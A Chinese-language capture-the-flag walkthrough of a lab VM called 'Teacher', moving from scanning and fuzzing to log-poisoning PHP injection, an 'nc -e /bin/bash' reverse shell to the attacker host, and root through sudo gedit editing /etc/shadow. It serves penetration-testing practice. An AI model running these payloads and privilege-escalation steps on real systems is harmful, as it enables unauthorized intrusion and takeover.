# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.43.0/24                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 01:02 EDT
Nmap scan report for 192.168.43.1
Host is up (0.0084s latency).
MAC Address: C6:45:66:05:91:88 (Unknown)
Nmap scan report for DESKTOP-3NRITEO (192.168.43.197)
Host is up (0.000062s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for Teacher (192.168.43.211)
Host is up (0.00028s latency).
MAC Address: 08:00:27:88:FF:7B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.43.126)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.96 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.43.211
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 01:02 EDT
Nmap scan report for Teacher (192.168.43.211)
Host is up (0.00043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:88:FF:7B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.85 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -O -p22,80 192.168.43.211  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 01:03 EDT
Nmap scan report for Teacher (192.168.43.211)
Host is up (0.00028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:88:FF:7B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
```

# 漏洞利用

看一下80端口，得到两个用户名：cool和avijneyam

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.43.211                    
<html>
<h1>Hi student, make this server secure please.</h1>
<p>Our first server got hacked by cool and avijneyam in the first hour, that server was just a test but this server is important becouse this will be used for teaching, if we get hacked you are getting an F</p>
<!-- Yes mrteacher I will do it -->
</html>
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.43.211 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.43.211
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,git,html,php,txt,jpg,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 315]
/.php                 (Status: 403) [Size: 279]
/log.php              (Status: 200) [Size: 23]
/manual               (Status: 301) [Size: 317] [--> http://192.168.43.211/manual/]                                             
/access.php           (Status: 200) [Size: 12]
/rabbit.jpg           (Status: 200) [Size: 130469]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/clearlogs.php        (Status: 200) [Size: 0]
/server-status        (Status: 403) [Size: 279]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 279]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/rabbit.jpg把图片下载下来看看有什么

```
┌──(kali㉿kali)-[~]
└─$ stegseek rabbit.jpg    
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "rabbithole"       
[i] Original filename: "secret.txt".
[i] Extracting to "rabbit.jpg.out".
```

![image](https://github.com/user-attachments/assets/05e1faee-4292-4325-86d9-62e62185b98e)

/access.php什么都没有发现，尝试模糊测试

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.43.211/access.php?FUZZ=id" -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -fc 403 -fs 0,12 -c -s
id
```

发现/log.php页面会记录access页面的命令

![image](https://github.com/user-attachments/assets/ce08e975-f40c-4ce2-877b-d36cfd3c1533)

反弹shell

```
/access.php?id=<?php system("nc -e /bin/bash 192.168.43.126 1234");?>
刷新/log.php页面
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234           
listening on [any] 1234 ...
connect to [192.168.43.126] from (UNKNOWN) [192.168.43.212] 37284
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

看一看都有什么

```
www-data@Teacher:/var/www/html$ ls -la
ls -la
total 5332
drwxr-xr-x 2 root      root         4096 Aug 26  2022 .
drwxr-xr-x 3 root      root         4096 Aug 24  2022 ..
-rw-r--r-- 1 root      root          191 Aug 25  2022 access.php
-rw-r--r-- 1 root      root           48 Aug 26  2022 clearlogs.php
-rw-r--r-- 1 mrteacher mrteacher 5301604 Aug 25  2022 e14e1598b4271d8449e7fcda302b7975.pdf
-rw-r--r-- 1 root      root          315 Aug 26  2022 index.html
-rwxrwxrwx 1 root      root           78 Jun  1 10:16 log.php
-rw-r--r-- 1 root      root       130469 Aug 26  2022 rabbit.jpg
www-data@Teacher:/var/www/html$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
www-data@Teacher:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/mount
/usr/bin/su
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
www-data@Teacher:/var/www/html$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
www-data@Teacher:/var/www/html$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
mrteacher:x:1000:1000:MRTeacher,,,:/home/mrteacher:/bin/bash
```

/e14e1598b4271d8449e7fcda302b7975.pdf，根据上一页的压痕，得到了密码：ThankYouTeachers

![image](https://github.com/user-attachments/assets/220d98de-a35a-4c22-b2a0-e27f2b1bcdb2)

登录mrteacher

```
www-data@Teacher:/var/www/html$ su mrteacher
su mrteacher
Password: ThankYouTeachers

mrteacher@Teacher:/var/www/html$ id
id
uid=1000(mrteacher) gid=1000(mrteacher) groups=1000(mrteacher),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth)
```

看一下都有什么

```
mrteacher@Teacher:~$ ls -la
ls -la
total 44
drwxr-xr-x 5 mrteacher mrteacher 4096 Sep  5  2022 .
drwxr-xr-x 3 root      root      4096 Aug 24  2022 ..
-rw------- 1 mrteacher mrteacher   34 Sep  6  2022 .bash_history
-rw-r--r-- 1 mrteacher mrteacher  220 Aug 24  2022 .bash_logout
-rw-r--r-- 1 mrteacher mrteacher 3541 Aug 28  2022 .bashrc
drwx------ 3 mrteacher mrteacher 4096 Aug 26  2022 .cache
drwx------ 6 mrteacher mrteacher 4096 Aug 26  2022 .config
drwxr-xr-x 3 mrteacher mrteacher 4096 Aug 26  2022 .local
-rw-r--r-- 1 mrteacher mrteacher  807 Aug 24  2022 .profile
-rw-r--r-- 1 mrteacher mrteacher   33 Aug 26  2022 user
-rw------- 1 mrteacher mrteacher   53 Sep  5  2022 .Xauthority
mrteacher@Teacher:~$ sudo -l
sudo -l
Matching Defaults entries for mrteacher on Teacher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrteacher may run the following commands on Teacher:
    (ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth
mrteacher@Teacher:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/mount
/usr/bin/su
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
mrteacher@Teacher:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
```

user

```
mrteacher@Teacher:~$ cat user
cat user
9cd1f0b79d9474714c5a29214ec839a6
```

![image](https://github.com/user-attachments/assets/a73cd4ac-e24d-47b2-857d-0d534a8efed5)

![image](https://github.com/user-attachments/assets/4fceaad2-74a6-48df-bed8-349e6d1cc068)

提权

```
ssh需要添加上-X参数不然无法使用gedit
mrteacher@Teacher:~$ xauth list
Teacher/unix:10  MIT-MAGIC-COOKIE-1  33e0826d25378e1df29a7024271a94bc
mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10  MIT-MAGIC-COOKIE-1  33e0826d25378e1df29a7024271a94bc
mrteacher@Teacher:~$ sudo gedit /etc/shadow
把root密码更改为mrteacher的
就可以用mrteacher的密码进行登录
mrteacher@Teacher:~$ su root
Password: 
root@Teacher:/home/mrteacher# id
uid=0(root) gid=0(root) groups=0(root)
```

root

```
root@Teacher:~# cat root
HappyBack2Sch00l
```
